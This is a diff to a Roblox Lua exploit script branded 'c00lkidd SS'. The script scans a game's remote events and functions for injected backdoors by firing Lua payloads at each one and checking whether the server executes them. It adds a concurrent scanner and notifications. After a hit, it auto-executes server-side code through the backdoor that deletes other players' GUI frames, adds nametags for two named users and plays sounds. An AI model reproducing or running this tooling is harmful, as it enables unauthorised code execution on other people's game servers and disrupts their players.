@@ -2193,14 +2193,70 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
         return req(obj)
     end
 
-        local player = game.Players.LocalPlayer
+        
+	local player = game.Players.LocalPlayer
 	local mouse = player:GetMouse()
 	local userInputService = game:GetService("UserInputService")
-	local runService = game:GetService("RunService")
 	local tweenService = game:GetService("TweenService")
 	local HttpService = game:GetService("HttpService")
 	local RunService = game:GetService("RunService")
+	
 	local rs = game:GetService("ReplicatedStorage")
+	local mode =3
+	local bg=1
+	
+	
+	local TweenService = game:GetService("TweenService")
+	local currentFadeOutThread = nil
+	
+	local function showNotification(titleText, descText, duration)
+		local notif = script.Parent.Notification
+		local title = notif:WaitForChild("Title")
+		local desc = notif:WaitForChild("Desc")
+	
+		-- cancel prev fade out thread
+		if currentFadeOutThread then
+			task.cancel(currentFadeOutThread)
+		end
+	
+		-- set text + show
+		title.Text = titleText
+		desc.Text = descText
+		notif.Visible = true
+		notif.BackgroundTransparency = 1
+		title.TextTransparency = 1
+		desc.TextTransparency = 1
+	
+		-- fade in
+		TweenService:Create(notif, TweenInfo.new(0.3), {
+			BackgroundTransparency = 0.2
+		}):Play()
+		TweenService:Create(title, TweenInfo.new(0.3), {
+			TextTransparency = 0
+		}):Play()
+		TweenService:Create(desc, TweenInfo.new(0.3), {
+			TextTransparency = 0
+		}):Play()
+	
+		-- start new fade out thread
+		currentFadeOutThread = task.spawn(function()
+			task.wait(duration)
+	
+			-- fade out
+			TweenService:Create(notif, TweenInfo.new(0.3), {
+				BackgroundTransparency = 1
+			}):Play()
+			TweenService:Create(title, TweenInfo.new(0.3), {
+				TextTransparency = 1
+			}):Play()
+			TweenService:Create(desc, TweenInfo.new(0.3), {
+				TextTransparency = 1
+			}):Play()
+	
+			task.wait(0.3)
+			notif.Visible = false
+		end)
+	end
 	
 	
 	local EXCLUDED_REMOTES = {
@@ -2225,36 +2281,24 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	}
 	
 	local foundExploit = false
-	local FinishedFound = false
-	local mode = 3
-	local bg = 1
 	local remoteEvent, remoteFunction
-	local scanTime = 0
+	local FinishedFound = false
+	local scannedRemotes = {}
 	
 	local function isLikelyBackdoorRemote(remote)
-		local name = remote.Name
-		local parent = remote.Parent
-	
-	
-		if SAFE_LOCATIONS[parent.ClassName] then
-			return false
-		end
-		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
-			return false
-		end 
-		if EXCLUDED_REMOTES[name] then
-			return false
-		end
-	
+		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
+		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then return false end
+		if EXCLUDED_REMOTES[remote.Name] then return false end
 	
 		return true
 	end
 	
-	local function testRemote(remote, isFunction)
-		if foundExploit then return false end
+	local function testRemote(remote, isFunction, timeout)
+		if foundExploit or scannedRemotes[remote] then return false end
+		scannedRemotes[remote] = true
 		if not isLikelyBackdoorRemote(remote) then return false end
-		local modelName = "starlight_"..tostring(os.clock()):gsub("%.", "")
-		local rs = game:GetService("ReplicatedStorage")
+	
+		local modelName = "starlight_"..tostring(math.random(1,999999))
 		local foundEvent = false
 	
 		local connection = rs.DescendantAdded:Connect(function(inst)
@@ -2269,27 +2313,33 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			if f then f:Destroy() end
 		end
 	
-		local success = pcall(function()
-			local payload = [[
-				local m=Instance.new("Folder")
-				m.Name="]]..modelName..[["
-				m.Parent=game:GetService("ReplicatedStorage")
-			]]
-			if isFunction then
-				remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
-			else
-				remote:FireServer(payload)
-			end
+		local payload = [[
+			local m=Instance.new("ObjectValue")
+			m.Name="]]..modelName..[["
+			m.Parent=game:GetService("ReplicatedStorage")
+		]]
+	
+		local finished = false
+	
+		task.spawn(function()
+			pcall(function()
+				if isFunction then
+					remote:InvokeServer(payload .. "\nreturn true")
+				else
+					remote:FireServer(payload)
+				end
+			end)
+			finished = true
 		end)
 	
-		local timeout = 1
 		local start = os.clock()
 		while os.clock() - start < timeout do
 			if foundEvent or rs:FindFirstChild(modelName) then
 				foundEvent = true
 				break
 			end
-			task.wait(0.003)
+			if finished then break end
+			task.wait()
 		end
 	
 		cleanup()
@@ -2306,48 +2356,77 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	
 		return false
 	end
-	local function findRemote()
-	local trueStart = os.clock()
-	foundExploit = false
-	remoteEvent = nil
-	remoteFunction = nil
-
-	local remotes = {}
-	for _, remote in next, game:GetDescendants() do
-		if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
-			remotes[#remotes + 1] = remote
-		end
-	end
-
-	local completed = 0
-	local total = #remotes
-
-	for i = 1, total do
-		task.spawn(function()
-			local ok, result = pcall(function()
-				return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
-			end)
-
-			if ok and result then
-				print("c00lkidd SS: ", remotes[i]:GetFullName())
+	
+	local function fastFindRemote(timeout)
+		foundExploit = false
+		remoteEvent = nil
+		remoteFunction = nil
+		scannedRemotes = {}
+	
+		local remotes = {}
+		for _, remote in ipairs(game:GetDescendants()) do
+			if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+				table.insert(remotes, remote)
 			end
-
-			completed += 1
+		end
+	
+		print(string.format("c00lkidd: 🔍 scanning %d remotes", #remotes))
+	
+		table.sort(remotes, function(a, b)
+			-- sort: sus name/loc first
+			local aScore = isLikelyBackdoorRemote(a) and 1 or 0
+			local bScore = isLikelyBackdoorRemote(b) and 1 or 0
+			return aScore > bScore
 		end)
+	
+		local MAX_CONCURRENT = 128
+		local activeTasks = 0
+		local taskDone = Instance.new("BindableEvent")
+	
+		for i = 1, #remotes do
+			if foundExploit then break end
+	
+			while activeTasks >= MAX_CONCURRENT do
+				taskDone.Event:Wait()
+			end
+	
+			activeTasks += 1
+			task.spawn(function()
+				local ok, result = pcall(function()
+					return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"), timeout)
+				end)
+	
+				if ok and result then
+					print("c00lkidd: backdoor found:", remotes[i]:GetFullName())
+					showNotification("c00lkidd","True",3)
+				end
+	
+				activeTasks -= 1
+				taskDone:Fire()
+			end)
+		end
+	
+		while activeTasks > 0 and not foundExploit do
+			taskDone.Event:Wait()
+		end
+	
+		if not foundExploit then
+			print("c00lkidd: backdoor not found")
+			showNotification("c00lkid","False",3)
+		end
+	
+		return foundExploit
 	end
-
-	while completed < total and not foundExploit do
-		task.wait()
-	end
-
-	scanTime = os.clock() - trueStart
-	FinishedFound = true
-
-	if not foundExploit then
-		print("c00lkidd backdoor: False")
-	end
-
-	print(string.format("c00lkidd : scan completed in %.3f seconds", scanTime))
+	
+	local function findRemote()
+		local trueStart = os.clock()
+		local tStart = os.clock()
+	
+		fastFindRemote(1)
+	
+		scanTime = os.clock() - trueStart
+		FinishedFound = true
+		print(string.format("c00lkidd: scan completed in %.3f seconds", os.clock() - tStart))
 	end
          local function fireRemoteEvent(code)
 		if remoteEvent then
@@ -2359,11 +2438,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 				remoteFunction:InvokeServer('starlightTSS', code)
 			end)
 		else
-			game.StarterGui:SetCore("SendNotification",{
-				Title = "c00lkidd",
-				Text = "No backdoor found, Please inject.",
-				Duration = 12
-			})
+			showNotification("c00lkid","Inject.",3)
 		end
 	end
 	script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
@@ -2455,11 +2530,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	
 	script.Parent.Logs.ToggleMode.MouseButton1Click:Connect(function()
 		if remoteFunction or remoteEvent then
-			game.StarterGui:SetCore("SendNotification",{
-				Title = "C00lkidd SS",
-				Text = "no",
-				Duration = 5
-			})
+			showNotification("c00lkid","No.",3)
 			return
 		end
 		FinishedFound = false
@@ -2514,11 +2585,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			script.Parent.Framee.Log.Visible = true
 			script.Parent.Framee.Log.Text = "[" .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "Unknown") .. "]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
-			game.StarterGui:SetCore("SendNotification",{
-				Title = "c00lkidd SS",
-				Text = "Backdoor Found in " .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),
-				Duration = 3
-			})
+			showNotification("c00lkid","" .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),3)
                      -- Auto executes-
 	                fireRemoteEvent('local Players=game:GetService("Players");local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","koma","gigxxx","hax0rz","g00l","enstrio","br1cked"};local function isSuspicious(str)str=str:lower();for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end;local function getOwningPlayer(i)local p=i;while p and not p:IsA("PlayerGui")do p=p.Parent end;if p and p:IsA("PlayerGui")then local c=p.Parent;return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end;return nil end;local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name;local t=i:IsA("TextLabel")and i.Text or"";if isSuspicious(n)or isSuspicious(t)then local f=i;while f and not f:IsA("Frame")do f=f.Parent end;if f then local pl=getOwningPlayer(f);local h=Instance.new("Hint",workspace);h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.Name..")"or"");task.delay(3,function()h:Destroy()end);f:Destroy()end end end end;for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end);task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;task.wait(5)end end);')
                         fireRemoteEvent('for _,p in ipairs(game.Players:GetPlayers())do if p.Name=="greguiscool"or p.Name=="raizarit"then if p.Character and p.Character:FindFirstChild("Head")then local t=Instance.new("BillboardGui");t.Name="NameTag";t.Adornee=p.Character.Head;t.Parent=p.Character.Head;t.Size=UDim2.new(0,200,0,50);t.StudsOffset=Vector3.new(0,2.5,0);t.AlwaysOnTop=true;local l=Instance.new("TextLabel",t);l.Size=UDim2.new(1,0,1,0);l.BackgroundTransparency=1;l.Font=Enum.Font.Arcade;l.TextScaled=true;l.TextColor3=Color3.fromRGB(255,223,0);if p.Name=="greguiscool"then l.Text="👑The Legend👑";elseif p.Name=="raizarit"then l.Text="⚡The Legend⚡";end end end end;local e=Instance.new("Hint",workspace);e.Text="⚡ A Legendary Presence Has Entered the Realm! All Hail the Legend! ⚡";local s=Instance.new("Sound");s.Parent=workspace;s.SoundId="rbxassetid://118529969200894";s.Looped=true;s.Volume=1;s.PlaybackSpeed=1;s.TimePosition=41;s:Play();wait(13.3);local d=2;local w=d/20;local v=s.Volume;for i=1,20 do s.Volume=v*(1-i/20);wait(w);end;s:Stop();e:Destroy();')
